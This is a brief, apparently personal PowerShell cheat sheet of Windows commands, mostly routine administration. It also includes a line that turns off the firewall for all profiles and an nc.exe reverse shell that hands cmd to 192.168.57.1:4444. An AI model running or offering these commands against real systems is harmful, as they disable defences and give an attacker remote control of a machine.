

```powershell
# disable firewall
netsh advfirewall set allprofiles state off
# download files
Invoke-WebRequest -Uri $url -OutFIle $path
# add user to a group
net localgroup group_name UserLoginName /add
# start a process in bg ---- env:comspec = cmd.exe
Start-Process -FilePath "z:\nc.exe" -ArgumentList "192.168.57.1 4444 -e cmd "
# icacls permissions , F = full perms
icacls "D:\test" /grant John:(OI)(CI)F /T
# run cmd as another user
runas /user:administrator cmd.exe
# unzip file
Expand-Archive C:\a.zip -DestinationPath C:\a
# or if it cmdlet does not exist
[System.Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem") | Out-Null
[System.IO.Compression.ZipFile]::ExtractToDirectory($pathToZip, $targetDir)
# list services
wmic service list brief

```



